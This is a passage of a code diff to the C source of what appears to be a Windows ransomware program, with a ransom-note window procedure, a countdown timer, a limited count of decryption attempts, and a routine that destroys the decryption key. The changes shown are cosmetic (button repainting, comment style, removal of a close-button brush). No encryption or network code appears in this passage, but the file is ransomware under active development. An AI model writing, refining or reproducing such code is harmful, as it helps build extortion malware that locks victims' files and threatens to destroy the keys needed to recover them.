 
             MessageBoxA(hWnd, msgBuf, "Decryption Failed", MB_OK | MB_ICONWARNING);
-            if (hBtn) EnableWindow(hBtn, TRUE);
+            if (hBtn) {
+                EnableWindow(hBtn, TRUE);
+                InvalidateRect(hBtn, NULL, TRUE);
+            }
 
         } else {
             if (failed == 0 && succeeded == 0) {
@@ -637,7 +813,10 @@ static LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM
             }
             if (hStatus) SetWindowTextA(hStatus, msgBuf);
             MessageBoxA(hWnd, msgBuf, "Decryption Result", MB_OK | MB_ICONINFORMATION);
-            if (hBtn) EnableWindow(hBtn, TRUE);
+            if (hBtn) {
+                EnableWindow(hBtn, TRUE);
+                InvalidateRect(hBtn, NULL, TRUE);
+            }
         }
         return 0;
     }
@@ -651,7 +830,7 @@ static LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM
     return DefWindowProcW(hWnd, msg, wParam, lParam);
 }
 
-/* —— Update timer display —— */
+/* — Update timer display — */
 static void UpdateTimerDisplay(HWND hWnd) {
     FILETIME ftNow;
     GetSystemTimeAsFileTime(&ftNow);
@@ -674,7 +853,7 @@ static void UpdateTimerDisplay(HWND hWnd) {
     SetDlgItemTextA(hWnd, IDC_TIMER, timeBuf);
 }
 
-/* —— Update attempts display —— */
+/* — Update attempts display — */
 static void UpdateAttemptsDisplay(HWND hWnd) {
     char buf[64];
     snprintf(buf, sizeof(buf), "Attempts: %d / %d",
@@ -684,7 +863,7 @@ static void UpdateAttemptsDisplay(HWND hWnd) {
               g_decryptAttempts, MAX_DECRYPT_ATTEMPTS);
 }
 
-/* —— Destroy key and close —— */
+/* — Destroy key and close — */
 static void DestroyKeyAndClose(HWND hWnd) {
     MiseryLog(MISERY_LOG_WARN, "RansomNote: Key destruction triggered!");
 
@@ -723,7 +902,7 @@ static void DestroyKeyAndClose(HWND hWnd) {
     DestroyWindow(hWnd);
 }
 
-/* —— Resource creation —— */
+/* — Resource creation — */
 static void CreateResources(void) {
     g_hbrBanner    = CreateSolidBrush(CLR_BANNER_BG);
     g_hbrBg        = CreateSolidBrush(CLR_BG);
@@ -732,7 +911,6 @@ static void CreateResources(void) {
     g_hbrCodeBg    = CreateSolidBrush(CLR_CODE_BG);
     g_hbrDecryptBg = CreateSolidBrush(CLR_DECRYPT_BG);
     g_hbrTimerBg   = CreateSolidBrush(CLR_TIMER_BG);
-    g_hbrCloseBtn  = CreateSolidBrush(CLR_HEADLINE);
 
     LOGFONTW lf;
     ZeroMemory(&lf, sizeof(lf));
@@ -772,7 +950,6 @@ static void DestroyResources(void) {
     if (g_hbrCodeBg)    DeleteObject(g_hbrCodeBg);
     if (g_hbrDecryptBg) DeleteObject(g_hbrDecryptBg);
     if (g_hbrTimerBg)   DeleteObject(g_hbrTimerBg);
-    if (g_hbrCloseBtn)  DeleteObject(g_hbrCloseBtn);
     if (g_hFontHead)    DeleteObject(g_hFontHead);
     if (g_hFontSub)     DeleteObject(g_hFontSub);
     if (g_hFontBody)    DeleteObject(g_hFontBody);
@@ -782,7 +959,7 @@ static void DestroyResources(void) {
     if (g_hFontTimer)   DeleteObject(g_hFontTimer);
 
     g_hbrBanner = g_hbrBg = g_hbrCard = g_hbrAccent = NULL;
-    g_hbrCodeBg = g_hbrDecryptBg = g_hbrTimerBg = g_hbrCloseBtn = NULL;
+    g_hbrCodeBg = g_hbrDecryptBg = g_hbrTimerBg = NULL;
     g_hFontHead = g_hFontSub = g_hFontBody = g_hFontSmall = NULL;
     g_hFontMono = g_hFontName = g_hFontTimer = NULL;
 }
